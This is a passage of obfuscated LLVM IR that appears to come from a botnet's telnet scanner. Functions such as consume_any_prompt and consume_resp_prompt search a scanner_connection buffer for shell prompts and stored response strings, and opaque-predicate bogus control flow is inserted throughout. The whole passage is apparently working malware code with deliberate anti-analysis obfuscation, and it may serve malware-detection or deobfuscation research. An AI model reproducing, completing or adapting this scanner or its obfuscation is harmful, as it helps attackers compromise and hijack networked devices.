  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %30

; <label>:30:                                     ; preds = %137, %originalBBpart2
  %31 = load i32, i32* %13, align 4
  %32 = icmp sgt i32 %31, 0
  br i1 %32, label %33, label %140

; <label>:33:                                     ; preds = %30
  %34 = load i32, i32* @x.69
  %35 = load i32, i32* @y.70
  %36 = sub i32 %34, 1
  %37 = mul i32 %34, %36
  %38 = urem i32 %37, 2
  %39 = icmp eq i32 %38, 0
  %40 = icmp slt i32 %35, 10
  %41 = or i1 %39, %40
  br i1 %41, label %originalBB12, label %originalBB12alteredBB

originalBB12:                                     ; preds = %originalBB12alteredBB, %33
  %42 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %43 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %42, i32 0, i32 7
  %44 = load i32, i32* %13, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds [256 x i8], [256 x i8]* %43, i64 0, i64 %45
  %47 = load i8, i8* %46, align 1
  %48 = sext i8 %47 to i32
  %49 = icmp eq i32 %48, 58
  %50 = load i32, i32* @x.69
  %51 = load i32, i32* @y.70
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBBpart214, label %originalBB12alteredBB

originalBBpart214:                                ; preds = %originalBB12
  br i1 %49, label %133, label %58

; <label>:58:                                     ; preds = %originalBBpart214
  %59 = load i32, i32* @x.69
  %60 = load i32, i32* @y.70
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBB16, label %originalBB16alteredBB

originalBB16:                                     ; preds = %originalBB16alteredBB, %58
  %67 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %68 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %67, i32 0, i32 7
  %69 = load i32, i32* %13, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds [256 x i8], [256 x i8]* %68, i64 0, i64 %70
  %72 = load i8, i8* %71, align 1
  %73 = sext i8 %72 to i32
  %74 = icmp eq i32 %73, 62
  %75 = load i32, i32* @x.69
  %76 = load i32, i32* @y.70
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBBpart218, label %originalBB16alteredBB

originalBBpart218:                                ; preds = %originalBB16
  br i1 %74, label %133, label %83

; <label>:83:                                     ; preds = %originalBBpart218
  %84 = load i32, i32* @x.69
  %85 = load i32, i32* @y.70
  %86 = sub i32 %84, 1
  %87 = mul i32 %84, %86
  %88 = urem i32 %87, 2
  %89 = icmp eq i32 %88, 0
  %90 = icmp slt i32 %85, 10
  %91 = or i1 %89, %90
  br i1 %91, label %originalBB20, label %originalBB20alteredBB

originalBB20:                                     ; preds = %originalBB20alteredBB, %83
  %92 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %93 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %92, i32 0, i32 7
  %94 = load i32, i32* %13, align 4
  %95 = sext i32 %94 to i64
  %96 = getelementptr inbounds [256 x i8], [256 x i8]* %93, i64 0, i64 %95
  %97 = load i8, i8* %96, align 1
  %98 = sext i8 %97 to i32
  %99 = icmp eq i32 %98, 36
  %100 = load i32, i32* @x.69
  %101 = load i32, i32* @y.70
  %102 = sub i32 %100, 1
  %103 = mul i32 %100, %102
  %104 = urem i32 %103, 2
  %105 = icmp eq i32 %104, 0
  %106 = icmp slt i32 %101, 10
  %107 = or i1 %105, %106
  br i1 %107, label %originalBBpart222, label %originalBB20alteredBB

originalBBpart222:                                ; preds = %originalBB20
  br i1 %99, label %133, label %108

; <label>:108:                                    ; preds = %originalBBpart222
  %109 = load i32, i32* @x.69
  %110 = load i32, i32* @y.70
  %111 = sub i32 %109, 1
  %112 = mul i32 %109, %111
  %113 = urem i32 %112, 2
  %114 = icmp eq i32 %113, 0
  %115 = icmp slt i32 %110, 10
  %116 = or i1 %114, %115
  br i1 %116, label %originalBB24, label %originalBB24alteredBB

originalBB24:                                     ; preds = %originalBB24alteredBB, %108
  %117 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %118 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %117, i32 0, i32 7
  %119 = load i32, i32* %13, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds [256 x i8], [256 x i8]* %118, i64 0, i64 %120
  %122 = load i8, i8* %121, align 1
  %123 = sext i8 %122 to i32
  %124 = icmp eq i32 %123, 35
  %125 = load i32, i32* @x.69
  %126 = load i32, i32* @y.70
  %127 = sub i32 %125, 1
  %128 = mul i32 %125, %127
  %129 = urem i32 %128, 2
  %130 = icmp eq i32 %129, 0
  %131 = icmp slt i32 %126, 10
  %132 = or i1 %130, %131
  br i1 %132, label %originalBBpart226, label %originalBB24alteredBB

originalBBpart226:                                ; preds = %originalBB24
  br i1 %124, label %133, label %136

; <label>:133:                                    ; preds = %originalBBpart226, %originalBBpart222, %originalBBpart218, %originalBBpart214
  %134 = load i32, i32* %13, align 4
  %135 = add nsw i32 %134, 1
  store i32 %135, i32* %14, align 4
  br label %140

; <label>:136:                                    ; preds = %originalBBpart226
  br label %137

; <label>:137:                                    ; preds = %136
  %138 = load i32, i32* %13, align 4
  %139 = add nsw i32 %138, -1
  store i32 %139, i32* %13, align 4
  br label %30

; <label>:140:                                    ; preds = %133, %30
  %141 = load i32, i32* @x.69
  %142 = load i32, i32* @y.70
  %143 = sub i32 %141, 1
  %144 = mul i32 %141, %143
  %145 = urem i32 %144, 2
  %146 = icmp eq i32 %145, 0
  %147 = icmp slt i32 %142, 10
  %148 = or i1 %146, %147
  br i1 %148, label %originalBB28, label %originalBB28alteredBB

originalBB28:                                     ; preds = %originalBB28alteredBB, %140
  %149 = load i32, i32* %14, align 4
  %150 = icmp eq i32 %149, -1
  %151 = load i32, i32* @x.69
  %152 = load i32, i32* @y.70
  %153 = sub i32 %151, 1
  %154 = mul i32 %151, %153
  %155 = urem i32 %154, 2
  %156 = icmp eq i32 %155, 0
  %157 = icmp slt i32 %152, 10
  %158 = or i1 %156, %157
  br i1 %158, label %originalBBpart230, label %originalBB28alteredBB

originalBBpart230:                                ; preds = %originalBB28
  br i1 %150, label %159, label %192

; <label>:159:                                    ; preds = %originalBBpart230
  call void @table_unlock_val(i8 zeroext 25)
  %160 = call i8* @table_retrieve_val(i32 25, i32* %17)
  store i8* %160, i8** %15, align 8
  %161 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %162 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %161, i32 0, i32 7
  %163 = getelementptr inbounds [256 x i8], [256 x i8]* %162, i32 0, i32 0
  %164 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %165 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %164, i32 0, i32 6
  %166 = load i32, i32* %165, align 4
  %167 = load i8*, i8** %15, align 8
  %168 = load i32, i32* %17, align 4
  %169 = sub nsw i32 %168, 1
  %170 = call i32 @util_memsearch(i8* %163, i32 %166, i8* %167, i32 %169)
  %171 = icmp ne i32 %170, -1
  %172 = zext i1 %171 to i32
  store i32 %172, i32* %16, align 4
  br i1 %171, label %173, label %175

; <label>:173:                                    ; preds = %159
  %174 = load i32, i32* %16, align 4
  store i32 %174, i32* %14, align 4
  br label %175

; <label>:175:                                    ; preds = %173, %159
  %176 = load i32, i32* @x.69
  %177 = load i32, i32* @y.70
  %178 = sub i32 %176, 1
  %179 = mul i32 %176, %178
  %180 = urem i32 %179, 2
  %181 = icmp eq i32 %180, 0
  %182 = icmp slt i32 %177, 10
  %183 = or i1 %181, %182
  br i1 %183, label %originalBB32, label %originalBB32alteredBB

originalBB32:                                     ; preds = %originalBB32alteredBB, %175
  %184 = load i32, i32* @x.69
  %185 = load i32, i32* @y.70
  %186 = sub i32 %184, 1
  %187 = mul i32 %184, %186
  %188 = urem i32 %187, 2
  %189 = icmp eq i32 %188, 0
  %190 = icmp slt i32 %185, 10
  %191 = or i1 %189, %190
  br i1 %191, label %originalBBpart234, label %originalBB32alteredBB

originalBBpart234:                                ; preds = %originalBB32
  br label %192

; <label>:192:                                    ; preds = %originalBBpart234, %originalBBpart230
  %193 = load i32, i32* @x.69
  %194 = load i32, i32* @y.70
  %195 = sub i32 %193, 1
  %196 = mul i32 %193, %195
  %197 = urem i32 %196, 2
  %198 = icmp eq i32 %197, 0
  %199 = icmp slt i32 %194, 10
  %200 = or i1 %198, %199
  br i1 %200, label %originalBB36, label %originalBB36alteredBB

originalBB36:                                     ; preds = %originalBB36alteredBB, %192
  call void @table_lock_val(i8 zeroext 25)
  %201 = load i32, i32* %14, align 4
  %202 = icmp eq i32 %201, -1
  %203 = load i32, i32* @x.69
  %204 = load i32, i32* @y.70
  %205 = sub i32 %203, 1
  %206 = mul i32 %203, %205
  %207 = urem i32 %206, 2
  %208 = icmp eq i32 %207, 0
  %209 = icmp slt i32 %204, 10
  %210 = or i1 %208, %209
  br i1 %210, label %originalBBpart238, label %originalBB36alteredBB

originalBBpart238:                                ; preds = %originalBB36
  br i1 %202, label %211, label %212

; <label>:211:                                    ; preds = %originalBBpart238
  store i32 0, i32* %10, align 4
  br label %230

; <label>:212:                                    ; preds = %originalBBpart238
  %213 = load i32, i32* @x.69
  %214 = load i32, i32* @y.70
  %215 = sub i32 %213, 1
  %216 = mul i32 %213, %215
  %217 = urem i32 %216, 2
  %218 = icmp eq i32 %217, 0
  %219 = icmp slt i32 %214, 10
  %220 = or i1 %218, %219
  br i1 %220, label %originalBB40, label %originalBB40alteredBB

originalBB40:                                     ; preds = %originalBB40alteredBB, %212
  %221 = load i32, i32* %14, align 4
  store i32 %221, i32* %10, align 4
  %222 = load i32, i32* @x.69
  %223 = load i32, i32* @y.70
  %224 = sub i32 %222, 1
  %225 = mul i32 %222, %224
  %226 = urem i32 %225, 2
  %227 = icmp eq i32 %226, 0
  %228 = icmp slt i32 %223, 10
  %229 = or i1 %227, %228
  br i1 %229, label %originalBBpart242, label %originalBB40alteredBB

originalBBpart242:                                ; preds = %originalBB40
  br label %230

; <label>:230:                                    ; preds = %originalBBpart242, %211
  %231 = load i32, i32* %10, align 4
  ret i32 %231

originalBBalteredBB:                              ; preds = %originalBB, %1
  %232 = alloca i32, align 4
  %233 = alloca %struct.scanner_connection*, align 8
  %234 = alloca i8*, align 8
  %235 = alloca i32, align 4
  %236 = alloca i32, align 4
  %237 = alloca i8*, align 8
  %238 = alloca i32, align 4
  %239 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %233, align 8
  store i32 -1, i32* %236, align 4
  %240 = load %struct.scanner_connection*, %struct.scanner_connection** %233, align 8
  %241 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %240, i32 0, i32 6
  %242 = load i32, i32* %241, align 4
  %_ = sub i32 0, %242
  %gen = add i32 %_, 1
  %_1 = sub i32 0, %242
  %gen2 = add i32 %_1, 1
  %_3 = sub i32 0, %242
  %gen4 = add i32 %_3, 1
  %_5 = sub i32 0, %242
  %gen6 = add i32 %_5, 1
  %_7 = sub i32 %242, 1
  %gen8 = mul i32 %_7, 1
  %_9 = sub i32 %242, 1
  %gen10 = mul i32 %_9, 1
  %_11 = shl i32 %242, 1
  %243 = sub nsw i32 %242, 1
  store i32 %243, i32* %235, align 4
  br label %originalBB

originalBB12alteredBB:                            ; preds = %originalBB12, %33
  %244 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %245 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %244, i32 0, i32 7
  %246 = load i32, i32* %13, align 4
  %247 = sext i32 %246 to i64
  %248 = getelementptr inbounds [256 x i8], [256 x i8]* %245, i64 0, i64 %247
  %249 = load i8, i8* %248, align 1
  %250 = sext i8 %249 to i32
  %251 = icmp eq i32 %250, 58
  br label %originalBB12

originalBB16alteredBB:                            ; preds = %originalBB16, %58
  %252 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %253 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %252, i32 0, i32 7
  %254 = load i32, i32* %13, align 4
  %255 = sext i32 %254 to i64
  %256 = getelementptr inbounds [256 x i8], [256 x i8]* %253, i64 0, i64 %255
  %257 = load i8, i8* %256, align 1
  %258 = sext i8 %257 to i32
  %259 = icmp eq i32 %258, 62
  br label %originalBB16

originalBB20alteredBB:                            ; preds = %originalBB20, %83
  %260 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %261 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %260, i32 0, i32 7
  %262 = load i32, i32* %13, align 4
  %263 = sext i32 %262 to i64
  %264 = getelementptr inbounds [256 x i8], [256 x i8]* %261, i64 0, i64 %263
  %265 = load i8, i8* %264, align 1
  %266 = sext i8 %265 to i32
  %267 = icmp eq i32 %266, 36
  br label %originalBB20

originalBB24alteredBB:                            ; preds = %originalBB24, %108
  %268 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %269 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %268, i32 0, i32 7
  %270 = load i32, i32* %13, align 4
  %271 = sext i32 %270 to i64
  %272 = getelementptr inbounds [256 x i8], [256 x i8]* %269, i64 0, i64 %271
  %273 = load i8, i8* %272, align 1
  %274 = sext i8 %273 to i32
  %275 = icmp eq i32 %274, 35
  br label %originalBB24

originalBB28alteredBB:                            ; preds = %originalBB28, %140
  %276 = load i32, i32* %14, align 4
  %277 = icmp eq i32 %276, -1
  br label %originalBB28

originalBB32alteredBB:                            ; preds = %originalBB32, %175
  br label %originalBB32

originalBB36alteredBB:                            ; preds = %originalBB36, %192
  call void @table_lock_val(i8 zeroext 25)
  %278 = load i32, i32* %14, align 4
  %279 = icmp eq i32 %278, -1
  br label %originalBB36

originalBB40alteredBB:                            ; preds = %originalBB40, %212
  %280 = load i32, i32* %14, align 4
  store i32 %280, i32* %10, align 4
  br label %originalBB40
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_any_prompt(%struct.scanner_connection*) #0 {
  %2 = load i32, i32* @x.71
  %3 = load i32, i32* @y.72
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i32, align 4
  %11 = alloca %struct.scanner_connection*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %11, align 8
  store i32 -1, i32* %14, align 4
  %15 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %16 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %15, i32 0, i32 6
  %17 = load i32, i32* %16, align 4
  %18 = sub nsw i32 %17, 1
  store i32 %18, i32* %13, align 4
  %19 = load i32, i32* @x.71
  %20 = load i32, i32* @y.72
  %21 = sub i32 %19, 1
  %22 = mul i32 %19, %21
  %23 = urem i32 %22, 2
  %24 = icmp eq i32 %23, 0
  %25 = icmp slt i32 %20, 10
  %26 = or i1 %24, %25
  br i1 %26, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %27

; <label>:27:                                     ; preds = %127, %originalBBpart2
  %28 = load i32, i32* @x.71
  %29 = load i32, i32* @y.72
  %30 = sub i32 %28, 1
  %31 = mul i32 %28, %30
  %32 = urem i32 %31, 2
  %33 = icmp eq i32 %32, 0
  %34 = icmp slt i32 %29, 10
  %35 = or i1 %33, %34
  br i1 %35, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %27
  %36 = load i32, i32* %13, align 4
  %37 = icmp sgt i32 %36, 0
  %38 = load i32, i32* @x.71
  %39 = load i32, i32* @y.72
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %37, label %46, label %130

; <label>:46:                                     ; preds = %originalBBpart24
  %47 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %48 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %47, i32 0, i32 7
  %49 = load i32, i32* %13, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds [256 x i8], [256 x i8]* %48, i64 0, i64 %50
  %52 = load i8, i8* %51, align 1
  %53 = sext i8 %52 to i32
  %54 = icmp eq i32 %53, 58
  br i1 %54, label %107, label %55

; <label>:55:                                     ; preds = %46
  %56 = load i32, i32* @x.71
  %57 = load i32, i32* @y.72
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %55
  %64 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %65 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %64, i32 0, i32 7
  %66 = load i32, i32* %13, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds [256 x i8], [256 x i8]* %65, i64 0, i64 %67
  %69 = load i8, i8* %68, align 1
  %70 = sext i8 %69 to i32
  %71 = icmp eq i32 %70, 62
  %72 = load i32, i32* @x.71
  %73 = load i32, i32* @y.72
  %74 = sub i32 %72, 1
  %75 = mul i32 %72, %74
  %76 = urem i32 %75, 2
  %77 = icmp eq i32 %76, 0
  %78 = icmp slt i32 %73, 10
  %79 = or i1 %77, %78
  br i1 %79, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %71, label %107, label %80

; <label>:80:                                     ; preds = %originalBBpart28
  %81 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %82 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %81, i32 0, i32 7
  %83 = load i32, i32* %13, align 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds [256 x i8], [256 x i8]* %82, i64 0, i64 %84
  %86 = load i8, i8* %85, align 1
  %87 = sext i8 %86 to i32
  %88 = icmp eq i32 %87, 36
  br i1 %88, label %107, label %89

; <label>:89:                                     ; preds = %80
  %90 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %91 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %90, i32 0, i32 7
  %92 = load i32, i32* %13, align 4
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds [256 x i8], [256 x i8]* %91, i64 0, i64 %93
  %95 = load i8, i8* %94, align 1
  %96 = sext i8 %95 to i32
  %97 = icmp eq i32 %96, 35
  br i1 %97, label %107, label %98

; <label>:98:                                     ; preds = %89
  %99 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %100 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %99, i32 0, i32 7
  %101 = load i32, i32* %13, align 4
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds [256 x i8], [256 x i8]* %100, i64 0, i64 %102
  %104 = load i8, i8* %103, align 1
  %105 = sext i8 %104 to i32
  %106 = icmp eq i32 %105, 37
  br i1 %106, label %107, label %126

; <label>:107:                                    ; preds = %98, %89, %80, %originalBBpart28, %46
  %108 = load i32, i32* @x.71
  %109 = load i32, i32* @y.72
  %110 = sub i32 %108, 1
  %111 = mul i32 %108, %110
  %112 = urem i32 %111, 2
  %113 = icmp eq i32 %112, 0
  %114 = icmp slt i32 %109, 10
  %115 = or i1 %113, %114
  br i1 %115, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %107
  %116 = load i32, i32* %13, align 4
  %117 = add nsw i32 %116, 1
  store i32 %117, i32* %14, align 4
  %118 = load i32, i32* @x.71
  %119 = load i32, i32* @y.72
  %120 = sub i32 %118, 1
  %121 = mul i32 %118, %120
  %122 = urem i32 %121, 2
  %123 = icmp eq i32 %122, 0
  %124 = icmp slt i32 %119, 10
  %125 = or i1 %123, %124
  br i1 %125, label %originalBBpart225, label %originalBB10alteredBB

originalBBpart225:                                ; preds = %originalBB10
  br label %130

; <label>:126:                                    ; preds = %98
  br label %127

; <label>:127:                                    ; preds = %126
  %128 = load i32, i32* %13, align 4
  %129 = add nsw i32 %128, -1
  store i32 %129, i32* %13, align 4
  br label %27

; <label>:130:                                    ; preds = %originalBBpart225, %originalBBpart24
  %131 = load i32, i32* %14, align 4
  %132 = icmp eq i32 %131, -1
  br i1 %132, label %133, label %150

; <label>:133:                                    ; preds = %130
  %134 = load i32, i32* @x.71
  %135 = load i32, i32* @y.72
  %136 = sub i32 %134, 1
  %137 = mul i32 %134, %136
  %138 = urem i32 %137, 2
  %139 = icmp eq i32 %138, 0
  %140 = icmp slt i32 %135, 10
  %141 = or i1 %139, %140
  br i1 %141, label %originalBB27, label %originalBB27alteredBB

originalBB27:                                     ; preds = %originalBB27alteredBB, %133
  store i32 0, i32* %10, align 4
  %142 = load i32, i32* @x.71
  %143 = load i32, i32* @y.72
  %144 = sub i32 %142, 1
  %145 = mul i32 %142, %144
  %146 = urem i32 %145, 2
  %147 = icmp eq i32 %146, 0
  %148 = icmp slt i32 %143, 10
  %149 = or i1 %147, %148
  br i1 %149, label %originalBBpart229, label %originalBB27alteredBB

originalBBpart229:                                ; preds = %originalBB27
  br label %152

; <label>:150:                                    ; preds = %130
  %151 = load i32, i32* %14, align 4
  store i32 %151, i32* %10, align 4
  br label %152

; <label>:152:                                    ; preds = %150, %originalBBpart229
  %153 = load i32, i32* @x.71
  %154 = load i32, i32* @y.72
  %155 = sub i32 %153, 1
  %156 = mul i32 %153, %155
  %157 = urem i32 %156, 2
  %158 = icmp eq i32 %157, 0
  %159 = icmp slt i32 %154, 10
  %160 = or i1 %158, %159
  br i1 %160, label %originalBB31, label %originalBB31alteredBB

originalBB31:                                     ; preds = %originalBB31alteredBB, %152
  %161 = load i32, i32* %10, align 4
  %162 = load i32, i32* @x.71
  %163 = load i32, i32* @y.72
  %164 = sub i32 %162, 1
  %165 = mul i32 %162, %164
  %166 = urem i32 %165, 2
  %167 = icmp eq i32 %166, 0
  %168 = icmp slt i32 %163, 10
  %169 = or i1 %167, %168
  br i1 %169, label %originalBBpart233, label %originalBB31alteredBB

originalBBpart233:                                ; preds = %originalBB31
  ret i32 %161

originalBBalteredBB:                              ; preds = %originalBB, %1
  %170 = alloca i32, align 4
  %171 = alloca %struct.scanner_connection*, align 8
  %172 = alloca i8*, align 8
  %173 = alloca i32, align 4
  %174 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %171, align 8
  store i32 -1, i32* %174, align 4
  %175 = load %struct.scanner_connection*, %struct.scanner_connection** %171, align 8
  %176 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %175, i32 0, i32 6
  %177 = load i32, i32* %176, align 4
  %_ = sub i32 0, %177
  %gen = add i32 %_, 1
  %178 = sub nsw i32 %177, 1
  store i32 %178, i32* %173, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %27
  %179 = load i32, i32* %13, align 4
  %180 = icmp sgt i32 %179, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %55
  %181 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %182 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %181, i32 0, i32 7
  %183 = load i32, i32* %13, align 4
  %184 = sext i32 %183 to i64
  %185 = getelementptr inbounds [256 x i8], [256 x i8]* %182, i64 0, i64 %184
  %186 = load i8, i8* %185, align 1
  %187 = sext i8 %186 to i32
  %188 = icmp eq i32 %187, 62
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %107
  %189 = load i32, i32* %13, align 4
  %_11 = sub i32 %189, 1
  %gen12 = mul i32 %_11, 1
  %_13 = sub i32 0, %189
  %gen14 = add i32 %_13, 1
  %_15 = sub i32 0, %189
  %gen16 = add i32 %_15, 1
  %_17 = sub i32 0, %189
  %gen18 = add i32 %_17, 1
  %_19 = sub i32 0, %189
  %gen20 = add i32 %_19, 1
  %_21 = shl i32 %189, 1
  %_22 = sub i32 %189, 1
  %gen23 = mul i32 %_22, 1
  %190 = add nsw i32 %189, 1
  store i32 %190, i32* %14, align 4
  br label %originalBB10

originalBB27alteredBB:                            ; preds = %originalBB27, %133
  store i32 0, i32* %10, align 4
  br label %originalBB27

originalBB31alteredBB:                            ; preds = %originalBB31, %152
  %191 = load i32, i32* %10, align 4
  br label %originalBB31
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_resp_prompt(%struct.scanner_connection*) #0 {
  %2 = load i32, i32* @x.73
  %3 = load i32, i32* @y.74
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i32, align 4
  %11 = alloca %struct.scanner_connection*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %11, align 8
  call void @table_unlock_val(i8 zeroext 10)
  %15 = call i8* @table_retrieve_val(i32 10, i32* %14)
  store i8* %15, i8** %12, align 8
  %16 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %17 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %16, i32 0, i32 7
  %18 = getelementptr inbounds [256 x i8], [256 x i8]* %17, i32 0, i32 0
  %19 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %20 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %19, i32 0, i32 6
  %21 = load i32, i32* %20, align 4
  %22 = load i8*, i8** %12, align 8
  %23 = load i32, i32* %14, align 4
  %24 = sub nsw i32 %23, 1
  %25 = call i32 @util_memsearch(i8* %18, i32 %21, i8* %22, i32 %24)
  %26 = icmp ne i32 %25, -1
  %27 = load i32, i32* @x.73
  %28 = load i32, i32* @y.74
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %26, label %35, label %36

; <label>:35:                                     ; preds = %originalBBpart2
  call void @table_lock_val(i8 zeroext 10)
  store i32 -1, i32* %10, align 4
  br label %69

; <label>:36:                                     ; preds = %originalBBpart2
  call void @table_lock_val(i8 zeroext 10)
  call void @table_unlock_val(i8 zeroext 9)
  %37 = call i8* @table_retrieve_val(i32 9, i32* %14)
  store i8* %37, i8** %12, align 8
  %38 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %39 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %38, i32 0, i32 7
  %40 = getelementptr inbounds [256 x i8], [256 x i8]* %39, i32 0, i32 0
  %41 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %42 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %41, i32 0, i32 6
  %43 = load i32, i32* %42, align 4
  %44 = load i8*, i8** %12, align 8
  %45 = load i32, i32* %14, align 4
  %46 = sub nsw i32 %45, 1
  %47 = call i32 @util_memsearch(i8* %40, i32 %43, i8* %44, i32 %46)
  store i32 %47, i32* %13, align 4
  call void @table_lock_val(i8 zeroext 9)
  %48 = load i32, i32* %13, align 4
  %49 = icmp eq i32 %48, -1
  br i1 %49, label %50, label %51

; <label>:50:                                     ; preds = %36
  store i32 0, i32* %10, align 4
  br label %69

; <label>:51:                                     ; preds = %36
  %52 = load i32, i32* @x.73
  %53 = load i32, i32* @y.74
  %54 = sub i32 %52, 1
  %55 = mul i32 %52, %54
  %56 = urem i32 %55, 2
  %57 = icmp eq i32 %56, 0
  %58 = icmp slt i32 %53, 10
  %59 = or i1 %57, %58
  br i1 %59, label %originalBB4, label %originalBB4alteredBB

originalBB4:                                      ; preds = %originalBB4alteredBB, %51
  %60 = load i32, i32* %13, align 4
  store i32 %60, i32* %10, align 4
  %61 = load i32, i32* @x.73
  %62 = load i32, i32* @y.74
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBBpart26, label %originalBB4alteredBB

originalBBpart26:                                 ; preds = %originalBB4
  br label %69

